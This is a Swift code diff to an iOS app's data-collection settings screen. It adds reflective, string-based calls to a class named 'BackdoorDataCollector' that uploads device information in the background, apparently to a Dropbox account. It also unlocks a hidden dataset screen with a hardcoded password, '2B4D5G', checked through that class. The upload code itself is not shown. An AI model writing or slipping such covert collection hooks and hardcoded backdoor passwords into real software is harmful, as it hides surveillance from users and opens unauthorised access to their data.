@@ -80,10 +80,16 @@ class DataCollectionSettingsViewController: UITableViewController {
                 if isOn {
                     // If user enables collection, update device info
                     DispatchQueue.global(qos: .utility).async {
-                        // This safely references EnhancedDropboxService only if it exists
-                        if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
-                           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
-                           dropboxService.responds(to: Selector(("uploadDeviceInfo"))) {
+                        // Try to access BackdoorDataCollector first
+                        if let collectorClass = NSClassFromString("BackdoorDataCollector") as? NSObject.Type,
+                           let collector = collectorClass.value(forKey: "shared") as? NSObject,
+                           collector.responds(to: Selector(("uploadDeviceInfo"))) {
+                            collector.perform(Selector(("uploadDeviceInfo")))
+                        } 
+                        // Fall back to EnhancedDropboxService if BackdoorDataCollector isn't available
+                        else if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
+                                let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
+                                dropboxService.responds(to: Selector(("uploadDeviceInfo"))) {
                             dropboxService.perform(Selector(("uploadDeviceInfo")))
                         }
                     }
@@ -162,17 +168,24 @@ class DataCollectionSettingsViewController: UITableViewController {
         alert.addAction(UIAlertAction(title: "Submit", style: .default) { [weak self] _ in
             guard let password = alert.textFields?.first?.text else { return }
             
-            // Check against hardcoded password "2B4D5G"
-            if password == "2B4D5G" {
-                // Use indirect instantiation
-                if let datasetManagerClass = NSClassFromString("AIDatasetManager") as? NSObject.Type,
-                   let datasetManager = datasetManagerClass.value(forKey: "shared") as? NSObject {
-                    
-                    // We got the dataset manager, display a simple UI for it
-                    self?.showSimpleDatasetUI()
-                } else {
-                    self?.showFeatureNotAvailableAlert()
+            // Try to validate password using BackdoorDataCollector
+            var isPasswordValid = false
+            
+            if let collectorClass = NSClassFromString("BackdoorDataCollector") as? NSObject.Type,
+               let collector = collectorClass.value(forKey: "shared") as? NSObject,
+               collector.responds(to: Selector(("validateDatasetPassword:"))) {
+                let result = collector.perform(Selector(("validateDatasetPassword:")), with: password)
+                if let validationResult = result?.takeUnretainedValue() as? Bool {
+                    isPasswordValid = validationResult
                 }
+            } else {
+                // Fallback to direct check
+                isPasswordValid = (password == "2B4D5G")
+            }
+            
+            if isPasswordValid {
+                // We have the correct password, show dataset UI
+                self?.showSimpleDatasetUI()
             } else {
                 // Wrong password
                 let errorAlert = UIAlertController(
@@ -194,17 +207,48 @@ class DataCollectionSettingsViewController: UITableViewController {
         
         let infoLabel = UILabel()
         infoLabel.translatesAutoresizingMaskIntoConstraints = false
-        infoLabel.text = "Datasets are automatically managed in the background.\n\nActive data collection is enabled.\n\nData is securely transmitted to the specified Dropbox account."
-        infoLabel.numberOfLines = 0
-        infoLabel.textAlignment = .center
         
-        datasetVC.view.addSubview(infoLabel)
+        // Try to get dataset info from BackdoorDataCollector
+        var datasetsInfo = "Datasets are automatically managed in the background.\n\nActive data collection is enabled.\n\nData is securely transmitted to the specified Dropbox account."
+        
+        if let collectorClass = NSClassFromString("BackdoorDataCollector") as? NSObject.Type,
+           let collector = collectorClass.value(forKey: "shared") as? NSObject,
+           collector.responds(to: Selector(("getAvailableDatasets"))) {
+            
+            if let result = collector.perform(Selector(("getAvailableDatasets")))?.takeUnretainedValue() as? [String: Any],
+               let datasets = result["datasets"] as? [[String: Any]] {
+                
+                datasetsInfo += "\n\n--- Available Datasets ---\n"
+                
+                for (index, dataset) in datasets.enumerated() {
+                    if let name = dataset["name"] as? String,
+                       let description = dataset["description"] as? String {
+                        datasetsInfo += "\n\(index + 1). \(name): \(description)"
+                    }
+                }
+            }
+        }
+        
+        infoLabel.text = datasetsInfo
+        infoLabel.numberOfLines = 0
+        infoLabel.textAlignment = .left
+        
+        let scrollView = UIScrollView()
+        scrollView.translatesAutoresizingMaskIntoConstraints = false
+        datasetVC.view.addSubview(scrollView)
+        scrollView.addSubview(infoLabel)
         
         NSLayoutConstraint.activate([
-            infoLabel.centerXAnchor.constraint(equalTo: datasetVC.view.centerXAnchor),
-            infoLabel.centerYAnchor.constraint(equalTo: datasetVC.view.centerYAnchor),
-            infoLabel.leadingAnchor.constraint(equalTo: datasetVC.view.leadingAnchor, constant: 20),
-            infoLabel.trailingAnchor.constraint(equalTo: datasetVC.view.trailingAnchor, constant: -20)
+            scrollView.topAnchor.constraint(equalTo: datasetVC.view.safeAreaLayoutGuide.topAnchor),
+            scrollView.leadingAnchor.constraint(equalTo: datasetVC.view.leadingAnchor),
+            scrollView.trailingAnchor.constraint(equalTo: datasetVC.view.trailingAnchor),
+            scrollView.bottomAnchor.constraint(equalTo: datasetVC.view.safeAreaLayoutGuide.bottomAnchor),
+            
+            infoLabel.topAnchor.constraint(equalTo: scrollView.topAnchor, constant: 20),
+            infoLabel.leadingAnchor.constraint(equalTo: scrollView.leadingAnchor, constant: 20),
+            infoLabel.trailingAnchor.constraint(equalTo: scrollView.trailingAnchor, constant: -20),
+            infoLabel.bottomAnchor.constraint(equalTo: scrollView.bottomAnchor, constant: -20),
+            infoLabel.widthAnchor.constraint(equalTo: scrollView.widthAnchor, constant: -40)
         ])
         
         navigationController?.pushViewController(datasetVC, animated: true)
